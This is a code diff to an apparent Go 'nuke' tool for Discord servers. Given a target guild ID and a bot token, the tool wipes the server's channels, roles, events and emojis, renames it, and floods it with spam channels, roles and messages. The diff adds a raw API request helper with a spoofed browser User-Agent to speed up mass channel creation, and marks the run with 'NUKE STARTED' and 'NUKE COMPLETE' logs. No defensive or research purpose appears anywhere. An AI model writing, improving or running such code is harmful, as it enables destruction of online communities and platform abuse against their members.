@@ -2,7 +2,9 @@ package main
 
 import (
 	"bufio"
+	"bytes"
 	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"io"
 	"math/rand"
@@ -18,7 +20,6 @@ import (
 
 const (
 	RESET        = "\033[0m"
-	BOLD         = "\033[1m"
 	CLEAR_SCREEN = "\033[2J\033[H"
 	HIDE_CURSOR  = "\033[?25l"
 	SHOW_CURSOR  = "\033[?25h"
@@ -192,6 +193,43 @@ func generateChannelName(baseNames []string) string {
 	return base + sb.String()
 }
 
+func apiRequest(method, url, token string, body []byte) (*http.Response, error) {
+	var bodyReader io.Reader
+	if body != nil {
+		bodyReader = bytes.NewReader(body)
+	}
+	req, err := http.NewRequest(method, url, bodyReader)
+	if err != nil {
+		return nil, err
+	}
+	req.Header.Set("Authorization", "Bot "+token)
+	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("User-Agent", "Mozilla/5.0")
+	client := &http.Client{Timeout: 30 * time.Second}
+	return client.Do(req)
+}
+
+func createChannelAPI(guildID, name, token string) (*discordgo.Channel, error) {
+	payload := map[string]interface{}{
+		"name": name,
+		"type": 0,
+	}
+	body, _ := json.Marshal(payload)
+	resp, err := apiRequest("POST", "https://discord.com/api/v9/guilds/"+guildID+"/channels", token, body)
+	if err != nil {
+		return nil, err
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode != 200 && resp.StatusCode != 201 {
+		return nil, fmt.Errorf("status %d", resp.StatusCode)
+	}
+	var ch discordgo.Channel
+	if err := json.NewDecoder(resp.Body).Decode(&ch); err != nil {
+		return nil, err
+	}
+	return &ch, nil
+}
+
 func main() {
 	clearScreen()
 	defer showCursor()
@@ -228,7 +266,7 @@ func main() {
 	logInfo("[+] Message content loaded from me.txt")
 
 	fmt.Println()
-	logInfo("")
+	logInfo("Configuration")
 	fmt.Println()
 
 	guildID := logQuestion("Enter target Guild ID: ")
@@ -252,7 +290,7 @@ func main() {
 	iconURL := logQuestion("Enter server icon URL (or leave empty): ")
 
 	fmt.Println()
-	logInfo("=== Summary ===")
+	logInfo("Summary")
 	logInfo(fmt.Sprintf("[i] Guild ID: %s", guildID))
 	logInfo(fmt.Sprintf("[i] Channels: %d", channelCount))
 	logInfo(fmt.Sprintf("[i] Messages/Channel: %d", messagesPerChannel))
@@ -274,7 +312,7 @@ func main() {
 
 	dg.AddHandler(func(s *discordgo.Session, r *discordgo.Ready) {
 		logInfo(fmt.Sprintf("[+] %s is connected!", r.User.Username))
-		go nukeGuild(s, guildID, serverName, iconURL, roleName, roleCount, roleColor, channelCount, messagesPerChannel, channelNames, messageContent)
+		go nukeGuild(s, token, guildID, serverName, iconURL, roleName, roleCount, roleColor, channelCount, messagesPerChannel, channelNames, messageContent)
 	})
 
 	err = dg.Open()
@@ -289,13 +327,12 @@ func main() {
 	select {}
 }
 
-func nukeGuild(s *discordgo.Session, guildID, serverName, iconURL, roleName string, roleCount, roleColor, channelCount, messagesPerChannel int, channelNames []string, messageContent string) {
+func nukeGuild(s *discordgo.Session, token, guildID, serverName, iconURL, roleName string, roleCount, roleColor, channelCount, messagesPerChannel int, channelNames []string, messageContent string) {
 	startTime := time.Now()
 	fmt.Println()
-	logInfo("nuke start")
+	logInfo("NUKE STARTED")
 	fmt.Println()
 
-	logInfo("[i] Changing server name and icon...")
 	go func() {
 		iconBase64 := downloadToBase64(iconURL)
 		g := &discordgo.GuildParams{Name: serverName}
@@ -310,7 +347,6 @@ func nukeGuild(s *discordgo.Session, guildID, serverName, iconURL, roleName stri
 		}
 	}()
 
-	logInfo("[i] Deleting existing channels...")
 	channels, _ := s.GuildChannels(guildID)
 	var chWg sync.WaitGroup
 	for _, ch := range channels {
@@ -327,27 +363,6 @@ func nukeGuild(s *discordgo.Session, guildID, serverName, iconURL, roleName stri
 	}
 	chWg.Wait()
 
-	logInfo("[i] Deleting existing roles...")
-	roles, _ := s.GuildRoles(guildID)
-	var roleWg sync.WaitGroup
-	for _, role := range roles {
-		if role.ID == guildID || role.Managed {
-			continue
-		}
-		roleWg.Add(1)
-		go func(rID, rName string) {
-			defer roleWg.Done()
-			err := s.GuildRoleDelete(guildID, rID)
-			if err != nil {
-				logFAIL("role delete", rName)
-			} else {
-				logOK("role delete", rName)
-			}
-		}(role.ID, role.Name)
-	}
-	roleWg.Wait()
-
-	logInfo("[i] Deleting existing events...")
 	events, _ := s.GuildScheduledEvents(guildID, false)
 	var evWg sync.WaitGroup
 	for _, ev := range events {
@@ -359,7 +374,6 @@ func nukeGuild(s *discordgo.Session, guildID, serverName, iconURL, roleName stri
 	}
 	evWg.Wait()
 
-	logInfo("[i] Deleting existing emojis...")
 	emojis, _ := s.GuildEmojis(guildID)
 	var emojiWg sync.WaitGroup
 	for _, em := range emojis {
@@ -373,7 +387,7 @@ func nukeGuild(s *discordgo.Session, guildID, serverName, iconURL, roleName stri
 
 	var createdChannels []*discordgo.Channel
 	if channelCount > 0 {
-		logInfo(fmt.Sprintf("[i] Creating %d channels at MAXIMUM SPEED...", channelCount))
+		logInfo(fmt.Sprintf("[i] Creating %d channels via API v9...", channelCount))
 		preGeneratedNames := make([]string, channelCount)
 		for i := 0; i < channelCount; i++ {
 			preGeneratedNames[i] = generateChannelName(channelNames)
@@ -387,10 +401,7 @@ func nukeGuild(s *discordgo.Session, guildID, serverName, iconURL, roleName stri
 			chCreateWg.Add(1)
 			go func(idx int, n string) {
 				defer chCreateWg.Done()
-				ch, err := s.GuildChannelCreateComplex(guildID, discordgo.GuildChannelCreateData{
-					Name: n,
-					Type: discordgo.ChannelTypeGuildText,
-				})
+				ch, err := createChannelAPI(guildID, n, token)
 				if err == nil {
 					chMu.Lock()
 					createdChannels = append(createdChannels, ch)
@@ -407,7 +418,7 @@ func nukeGuild(s *discordgo.Session, guildID, serverName, iconURL, roleName stri
 
 	if messagesPerChannel > 0 && len(createdChannels) > 0 {
 		totalMsgs := len(createdChannels) * messagesPerChannel
-		logInfo(fmt.Sprintf("[i] Sending %d messages at MAXIMUM SPEED...", totalMsgs))
+		logInfo(fmt.Sprintf("[i] Sending %d messages...", totalMsgs))
 		var msgWg sync.WaitGroup
 		msgSuccess := 0
 		msgErr := 0
@@ -435,30 +446,6 @@ func nukeGuild(s *discordgo.Session, guildID, serverName, iconURL, roleName stri
 		}
 		msgWg.Wait()
 		logInfo(fmt.Sprintf("[+] Sent %d/%d messages (errors: %d)!", msgSuccess, totalMsgs, msgErr))
-	}
-
-	if roleCount > 0 {
-		logInfo(fmt.Sprintf("[i] Creating %d roles...", roleCount))
-		roleColorVal := roleColor
-		var roleCreateWg sync.WaitGroup
-		for i := 0; i < roleCount; i++ {
-			roleCreateWg.Add(1)
-			go func(idx int) {
-				defer roleCreateWg.Done()
-				_, err := s.GuildRoleCreate(guildID, &discordgo.RoleParams{
-					Name:        roleName,
-					Color:       &roleColorVal,
-					Hoist:       boolPtr(true),
-					Mentionable: boolPtr(true),
-				})
-				if err != nil {
-					logFAIL("role make", err.Error())
-				} else {
-					logOK("role make", roleName)
-				}
-			}(i)
-		}
-		roleCreateWg.Wait()
 	}
 
 	logInfo("[i] Sending embed to rules channel...")
@@ -494,8 +481,51 @@ func nukeGuild(s *discordgo.Session, guildID, serverName, iconURL, roleName stri
 		logFAIL("embed send", "no rules channel found")
 	}
 
+	roles, _ := s.GuildRoles(guildID)
+	var roleDelWg sync.WaitGroup
+	for _, role := range roles {
+		if role.ID == guildID || role.Managed {
+			continue
+		}
+		roleDelWg.Add(1)
+		go func(rID, rName string) {
+			defer roleDelWg.Done()
+			err := s.GuildRoleDelete(guildID, rID)
+			if err != nil {
+				logFAIL("role delete", rName)
+			} else {
+				logOK("role delete", rName)
+			}
+		}(role.ID, role.Name)
+	}
+	roleDelWg.Wait()
+
+	if roleCount > 0 {
+		logInfo(fmt.Sprintf("[i] Creating %d roles...", roleCount))
+		roleColorVal := roleColor
+		var roleCreateWg sync.WaitGroup
+		for i := 0; i < roleCount; i++ {
+			roleCreateWg.Add(1)
+			go func(idx int) {
+				defer roleCreateWg.Done()
+				_, err := s.GuildRoleCreate(guildID, &discordgo.RoleParams{
+					Name:        roleName,
+					Color:       &roleColorVal,
+					Hoist:       boolPtr(true),
+					Mentionable: boolPtr(true),
+				})
+				if err != nil {
+					logFAIL("role make", err.Error())
+				} else {
+					logOK("role make", roleName)
+				}
+			}(i)
+		}
+		roleCreateWg.Wait()
+	}
+
 	fmt.Println()
-	logInfo("")
+	logInfo("NUKE COMPLETE")
 	logInfo(fmt.Sprintf("[+] Total execution time: %v", time.Since(startTime)))
 	fmt.Println()
 }
